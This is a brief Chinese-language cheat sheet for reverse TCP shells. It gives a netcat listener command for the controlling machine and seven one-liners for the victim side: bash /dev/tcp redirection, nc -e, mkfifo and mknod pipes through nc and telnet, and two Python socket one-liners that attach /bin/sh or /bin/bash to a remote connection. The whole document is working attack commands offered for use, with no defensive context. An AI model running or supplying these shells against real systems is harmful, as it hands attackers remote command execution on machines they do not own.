# 反弹TCP，Reverse TCP

## 控制端

    nc -lvv -p 4444

## 被控端（下面任选一种方式）

```bash
    bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

    nc -e /bin/bash 127.0.0.1 4444
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f
    
    nc 127.0.0.1 2333|/bin/sh|nc 127.0.0.1 2444
    
    mknod backpipe p && telnet x.x.x.x 2333 0<backpipe | /bin/bash 1>backpipe
```

使用python

```bash

    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'

    python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
```